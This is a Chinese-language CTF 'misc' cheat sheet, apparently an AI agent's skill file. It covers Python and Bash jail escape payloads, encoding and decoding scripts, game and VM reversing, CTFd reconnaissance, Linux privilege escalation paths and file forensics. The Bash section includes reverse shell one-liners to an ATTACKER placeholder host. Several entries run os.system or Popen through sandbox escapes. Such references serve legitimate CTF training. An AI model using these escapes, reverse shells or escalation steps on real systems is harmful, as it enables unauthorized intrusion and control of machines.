# Misc CTF Skill (v9 增强版)

## 解题顺序

1. `file` 识别文件类型
2. `strings -n 6` 提取可疑字符串
3. `binwalk` 检查嵌入文件
4. `exiftool` 元数据分析
5. 特定工具深度分析

## Python Jail 逃逸

### 基础绕过
```python
# 阻止 import:
__builtins__['__import__']('os').system('cat /flag*')
# 或:
().__class__.__bases__[0].__subclasses__()  # 找 os._wrap_close

# 阻止 __:
getattr(getattr(getattr((), '__class__'), '__bases__')[0], '__subclasses__')()
# 或用 Unicode:
ｕｎｄｅｒｓｃｏｒｅ = chr(95)  # Unicode 全角下划线

# 阻止引号:
chr(111)+chr(115) → 'os'
# 或:
bytes([111,115]).decode() → 'os'
```

### 常用逃逸 payload
```python
# 1. 直接 import (如允许):
import os; os.system('cat /flag*')

# 2. __builtins__ 访问:
__builtins__.__import__('os').system('id')

# 3. 类继承链:
[c for c in ().__class__.__bases__[0].__subclasses__() if 'Popen' in c.__name__][0](['cat','/flag'],stdout=-1).communicate()[0]

# 4. eval/exec 绕过:
exec(chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115)+chr(59)+chr(111)+chr(115)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(99)+chr(97)+chr(116)+chr(32)+chr(47)+chr(102)+chr(108)+chr(97)+chr(103)+chr(39)+chr(41))

# 5. breakpoint (Python 3.7+):
breakpoint()  # 进入 pdb → !import os; os.system('cat /flag*')

# 6. help() 交互:
help()  # 进入帮助 → 输入 modules → 搜索 os → 退出后 import

# 7. os.system 通过 subprocess:
__builtins__['exec']("import subprocess\nsubprocess.Popen(['cat','/flag'])")

# 8. getattr 链:
getattr(getattr(getattr((), '__class__'), '__bases__')[0], '__subclasses__')()
```

### PYTHONWARNINGS 技术
```text
# 环境变量注入:
PYTHONWARNINGS=ignore::antigravity.Foo::0
# 配合 BROWSER 变量:
BROWSER="/bin/sh -c 'cat /flag' %s" python3 -c "import antigravity"
```

### 常见过滤绕过
```python
# 阻止空格:
eval(chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115))
# 或: 用 exec(bytes([...]))

# 阻止点号:
getattr(__builtins__, '__import__')  # 替代 __builtins__.__import__

# 阻止数字:
int(True) + int(False)  # 1 + 0 = 1
# 或: len("aa")  # 2

# AST 沙箱:
# 检查抽象语法树节点类型 → 用允许的节点构造恶意代码
# 如: 列表推导式代替 for 循环
```

## Bash Jail 逃逸

### 基础绕过
```bash
# 阻止 /:
echo "$HOME"     # → /home/user
cd "$HOME"       # 使用变量
# 或:
cd ~

# 阻止空格:
{cat,/flag*}
cat${IFS}/flag*
cat</flag

# 阻止关键字:
# cat 被阻: tac, nl, more, less, head, tail, sort, rev, od
# ls 被阻: dir, echo *, find
# / 被阻: cd ~, echo $HOME

# 反弹 shell:
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
# 或: nc -e /bin/sh ATTACKER 4444
```

### 常用绕过
```bash
# 变量拼接:
a=ca;b=t;$a$b /flag

# 编码:
echo "Y2F0IC9mbGFn" | base64 -d | bash  # cat /flag

# 通配符:
/bin/ca? /flag
/*/flag

# 十六进制:
$(printf '\x63\x61\x74\x20\x2f\x66\x6c\x61\x67')

# here-string:
cat<<<"/flag"

# dd 读取:
dd if=/flag bs=1M

# rev:
rev /flag | rev

# 通过 python:
python3 -c "print(open('/flag').read())"
```

## 编码识别与转换

### 常见编码
```text
Base16 (Hex): 0-9A-F
Base32: A-Z2-7=
Base64: A-Za-z0-9+/=
Base85/Ascii85: !-u (或 z)
Base58: 123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz
Base62: 0-9A-Za-z
Base36: 0-9A-Z

Binary: 01
Octal: 0-7
Decimal: 0-9

ROT13: 字母替换 a↔n, b↔o...
Caesar: 位移密码 (25 种可能)

Morse: .- / − (点和线)

URL编码: %XX
HTML实体: &#60; &#x3c;
Unicode: \u003c
```

### 判断编码类型
```python
# 纯 0-9a-f → Hex
# A-Za-z0-9+/= → Base64
# A-Z2-7= → Base32
# 只有 .- 和空格 → Morse
# 全大写字母 + 可读 → ROT13/Caesar
# 包含 !#$%&()*+-→ Base85
```

### 解码脚本
```python
import base64, codecs

# 多层解码:
def auto_decode(data):
    while True:
        try: data = base64.b64decode(data).decode(); continue
        except: pass
        try: data = base64.b32decode(data).decode(); continue
        except: pass
        try: data = codecs.decode(data, 'rot_13'); continue
        except: pass
        break
    return data
```

### 自定义 Base
```python
# 替换 alphabet:
custom = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz+/"
import string
trantab = str.maketrans(custom, string.ascii_uppercase + string.ascii_lowercase + string.digits + '+/')
decoded = base64.b64decode(data.translate(trantab))
```

### 二进制/Morse 解码
```python
# Morse 解码:
MORSE = {'.-':'A', '-...':'B', '-.-.':'C', ...}
def decode_morse(s):
    return ''.join(MORSE.get(c, '?') for c in s.split())

# 二进制 → ASCII:
bytes(int(s[i:i+8], 2) for i in range(0, len(s), 8)).decode()
```

## 游戏/VM 逆向

### 常见类型
```text
1. 贪吃蛇/俄罗斯方块 → 修改分数/内存
2. HTML5 游戏 → 修改 JavaScript 变量
3. Flash 游戏 → 反编译 SWF, 修改代码
4. 网络游戏 → 修改封包
5. 自定义 VM → 逆向 opcode, 构造输入
```

### Web 游戏 JS 修改
```javascript
// DevTools Console:
// 1. 找游戏变量:
Object.keys(window)
// 2. 修改分数/生命:
score = 999999
lives = 999
// 3. 设置断点 → 找关键比较
debugger;
// 4. 修改 WebSocket 消息
```

### 自定义 VM 逆向
```text
1. 识别 VM 结构: opcodes, registers, stack, program counter
2. 反汇编 bytecode → 伪代码
3. 找关键比较/跳转
4. 构造输入满足条件
5. 或: patch bytecode 绕过检查
```

### GameMaker / Unity 游戏
```bash
# GameMaker:
# data.win → 反编译 (UndertaleModTool)

# Unity:
# Assembly-CSharp.dll → dnSpy/ILSpy
# assets → AssetStudio 提取
```

## CTF 平台导航

### CTFd 平台常见技巧
```text
1. 查看 /api/v1/challenges → 获取题目列表
2. 查看 /api/v1/scoreboard → 分数板
3. 查看 /api/v1/submissions → 提交记录
4. 检查 robots.txt 和 sitemap.xml
5. 查看源代码中的隐藏注释
6. 检查 JavaScript 文件中的 API 端点
7. 检查 /api/v1/flags → 可能有未保护的 flag
```

### 常见隐藏信息位置
```text
1. HTTP 响应头
2. HTML 注释 (<!-- flag -->)
3. CSS 注释 (/* flag */)
4. JS 注释 (// flag)
5. robots.txt / sitemap.xml
6. .git/ 目录泄露
7. .env 文件
8. Cookie 值
9. DNS TXT 记录
10. HTTPS 证书信息
```

## DNS 与网络

### DNS 查询
```bash
# 记录查询:
dig ANY target.com
dig TXT target.com
# 区域传送:
dig AXFR target.com @ns.target.com

# 反向查找:
dig -x IP_ADDRESS

# DNS over HTTPS:
curl "https://dns.google/resolve?name=target.com&type=TXT"
```

### 网络调试
```bash
# TCP 连接:
nc target port

# HTTP 请求:
curl -sv http://target:port/

# nmap 扫描:
nmap -sV -sC target

# ARP/路由:
arp -a
traceroute target
```

## Linux 提权

### 基础检查
```bash
id                     # 当前用户
sudo -l                # sudo 权限
find / -perm -4000 2>/dev/null  # SUID
cat /etc/crontab       # 定时任务
ls -la /tmp            # 临时文件
```

### 常见提权路径
```text
1. SUID 二进制: find, vim, nmap, python, bash, less, more, cp
2. sudo 配置错误: (ALL) NOPASSWD: /usr/bin/find
3. 内核漏洞: Dirty COW, PWNKIT
4. 定时任务: 可写的脚本被 root 执行
5. Docker: 用户在 docker 组 → 特权容器
6. Capabilities: cap_setuid+ep
7. 可写的 /etc/passwd
8. NFS no_root_squash
```

## PNG 分析

### Chunk 检查
```bash
pngcheck -v <file>
```

### Zlib Stream
```python
import zlib, struct
with open('file.png', 'rb') as f:
    data = f.read()
idx = data.find(b'IDAT')
length = struct.unpack('>I', data[idx-4:idx])[0]
zlib_data = data[idx+4:idx+4+length]
decompressed = zlib.decompress(zlib_data)
```

## 音频隐写

### Spectrogram
```bash
ffmpeg -i audio -lavfi showspectrumpic=s=1024x1024 spectrogram.png
```

## Zip 伪加密 / 爆破

```python
# 伪加密: 修改加密标志位
# Local File Header offset 6-7: frFlags
# Central Directory offset 8-9: frFlags
# 置 0x0000 即可移除加密
```

## 文件尾追加 / Polyglot
```bash
xxd file | tail -20
binwalk -e file
foremost file
```

## 安全边界

- 不攻击非授权目标
- 不使用社工/钓鱼
